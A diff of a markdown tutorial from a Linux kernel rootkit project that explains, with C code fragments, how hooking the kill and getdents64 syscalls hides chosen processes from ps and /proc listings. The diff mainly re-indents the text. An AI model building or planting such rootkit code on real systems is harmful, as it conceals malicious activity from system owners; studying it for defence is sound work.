@@ -1365,7 +1365,7 @@ So, a recap about the Workflow of the machanism:
 - When we deliver pid of any process via `kill -32 <pid>`, it will at first find out that particular `pid` by surfing through "`/proc/`" directory.
 - After getting the `pid`, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using ***ps***.
 
-1. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
+a) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99).\
 Finding the process id/ pid:\
 According to [LKM_HACKING](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.):
 
@@ -1413,8 +1413,9 @@ struct task_struct *find_task(pid_t pid)
 ```
 This is basically a for loop macro. I got this expression from  [diamorphine](https://github.com/m0nad/Diamorphine/) project. Then searched it in [bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601).
                     
-2. Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).\
-   We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.
+b) Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118).\
+We will now make a function to hide those directories responsible for corresponding `pid`. Got this portion from [heroin](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b) and [diamorphine](https://github.com/m0nad/Diamorphine/) project.
+
 ```c
 /* Here, -"&gt;" : -">" and "&amp;" : "&" */
 
@@ -1433,7 +1434,7 @@ int is_invisible(pid_t pid)
 	return(0);
 }
 ```
-   I made some changes,
+I made some changes,
 ```c
  #define PF_INVISIBLE 0x10000000
 
@@ -1457,14 +1458,14 @@ static int is_invisible(pid_t pid)
 	return 0;
 }
 ```
-   Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/4eb75d38eee64a1d804e49220c9cbff092671faf/kernel_src/include/hook_syscall_helper.h#L137)\
-    Now, comes the last and final part: ***getdents64*** syscall interception.
+Visit: [repo](https://github.com/reveng007/reveng_rtkit/blob/4eb75d38eee64a1d804e49220c9cbff092671faf/kernel_src/include/hook_syscall_helper.h#L137)\
+Now, comes the last and final part: ***getdents64*** syscall interception.
 
-   This portion is totally taken from [diamorphine](https://github.com/m0nad/Diamorphine/)
+This portion is totally taken from [diamorphine](https://github.com/m0nad/Diamorphine/)
                    
-   1. This is the whole rootkit.c file.
+1. This is the whole rootkit.c file.
 ```c
-  // Test_rtkit.c
+// Test_rtkit.c
 
 #include <linux/init.h>		/* Needed for the macros */
 #include <linux/module.h>	/* Needed by all modules */
@@ -1552,9 +1553,9 @@ MODULE_AUTHOR("reveng007");
 MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
 MODULE_VERSION("1.0");
 ```
-   This code is same as before (the kill syscall portion), just `__NR_getdents64` is added (new), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447). 
+This code is same as before (the kill syscall portion), just `__NR_getdents64` is added (new), [source](https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447). 
 
-   Let us go step by step from `Test_hook_getdents64.h` file:
+Let us go step by step from `Test_hook_getdents64.h` file:
 ```c
 // Test_hook_getdents64.h
 
@@ -1567,31 +1568,31 @@ MODULE_VERSION("1.0");
 #include <linux/dirent.h>	/* struct dirent refers to directory entry. */
 
 struct linux_dirent {
-    unsigned long   d_ino;		/* inode number */
-    unsigned long   d_off;		/* offset to the next dirent */
+    unsigned long   d_ino;	/* inode number */
+    unsigned long   d_off;	/* offset to the next dirent */
     unsigned short  d_reclen;	/* length of this record */
     char            d_name[1];	/* filename */
 };
 
 static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
 {
-/* Dependent registers:
-* rax: contains syscall ids = 0xd9
-* rdi: which contains the file descriptor = unsigned int fd
-* rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
-* rdx: length of the passed argument(or string) = unsigned int count
-*/
+	/* Dependent registers:
+	 * rax: contains syscall ids = 0xd9
+	 * rdi: which contains the file descriptor = unsigned int fd
+	 * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
+	 * rdx: length of the passed argument(or string) = unsigned int count
+	 */
 
-    // Storing file descriptor 
-    int fd = (int) pt_regs->di;
+    	// Storing file descriptor 
+    	int fd = (int) pt_regs->di;
 
-    /* User space related variable
-* Storing the name of the directory passed from user space via "si" register
-*/
-    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
+	/* User space related variable
+	* Storing the name of the directory passed from user space via "si" register
+	*/
+    	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
 
-    int ret = orig_getdents64(pt_regs), err;
-...
+    	int ret = orig_getdents64(pt_regs), err;
+	...
 ```
 linux/slab.h: Will be used to allocate memories in ram for directory entries.
 linux/fdtable.h: For accessing file table structure.
@@ -1647,25 +1648,25 @@ Now to the next part:
 	      kfree(kdirent);
 	      return ret;
 ```
-   Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.\
-   In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.
+Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.\
+In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.
 
-   For the case of ***kzalloc***, `GFP_KERNEL` is _GFP flag_ which is used for kernel-internal allocations, [source: elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/gfp.h#L245).
+For the case of ***kzalloc***, `GFP_KERNEL` is _GFP flag_ which is used for kernel-internal allocations, [source: elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/gfp.h#L245).
 
-   The last thing, which need explanation is the <ins>error part</ins>. If some error occurs, like sending <ins>wrong</ins> `pid` number to kernel space, we will free the allocated memory pointed by the kdirent pointer and would return the error which actually occured.
+The last thing, which need explanation is the <ins>error part</ins>. If some error occurs, like sending <ins>wrong</ins> `pid` number to kernel space, we will free the allocated memory pointed by the kdirent pointer and would return the error which actually occured.
 
-   Next part:
+Next part:
 ```c
-                   // Storing the inode value of the required directory(or pid) 
-                   d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+	// Storing the inode value of the required directory(or pid) 
+	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 
-                   if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
-                            /*&& MINOR(d_inode->i_rdev) == 1*/)
-                            proc = 1;
-                    ...
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
+		/*&& MINOR(d_inode->i_rdev) == 1*/)
+		proc = 1;
+	...
 ```
-  I paraphrased from [jm33.me](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html):\
-  This piece of code checks if current `fd` points to proc fs, if yes, we say we are `ls`ing a `/proc` dir. `i_ino` is a inode number, representing its index number in linux vfs (virtual filesystem), `PROC_ROOT_INO` is defined as 1: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/proc_ns.h#L42).
+I paraphrased from [jm33.me](https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html):\
+This piece of code checks if current `fd` points to proc fs, if yes, we say we are `ls`ing a `/proc` dir. `i_ino` is a inode number, representing its index number in linux vfs (virtual filesystem), `PROC_ROOT_INO` is defined as 1: [elixir.bootlin](https://elixir.bootlin.com/linux/v5.11/source/include/linux/proc_ns.h#L42).
 ```c
 /*
  * We always define these enumerators
@@ -1678,11 +1679,11 @@ enum {
 	PROC_PID_INIT_INO	= 0xEFFFFFFCU,
 	PROC_CGROUP_INIT_INO	= 0xEFFFFFFBU,
 	PROC_TIME_INIT_INO	= 0xEFFFFFFAU,
-    };
+};
 ```
-   That means, if `i_ino` of any inode is same as `PROC_ROOT_INO`, its name will be `/proc`.
+That means, if `i_ino` of any inode is same as `PROC_ROOT_INO`, its name will be `/proc`.
    
-   The final part of the getdents64 syscall:
+The final part of the getdents64 syscall:
 ```c
 	// Changes which we will do
 	while (offset < ret)
@@ -1706,14 +1707,14 @@ enum {
 	offset += dir->d_reclen;
 }
 ```
-   The while loop goes through the _array of dirent_ returned by getdents64 (or, in this context orig_getdents64).\
-   It checks whether.
-   1. The directory entry within the _array of dirent_ is in `/proc/` directory
-   2. It is invisible
+The while loop goes through the _array of dirent_ returned by getdents64 (or, in this context orig_getdents64).\
+It checks whether.
+1. The directory entry within the _array of dirent_ is in `/proc/` directory
+2. It is invisible
 
-   It then performs the changes to the `kdirent` then eventually to `dirent`, so that it can be passed to user space.
+It then performs the changes to the `kdirent` then eventually to `dirent`, so that it can be passed to user space.
 
-   Whole Code (Test_hook_getdents64.h):
+Whole Code (Test_hook_getdents64.h):
 ```c
 #include <linux/syscalls.h>     /* Needed to use syscall functions */
 #include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
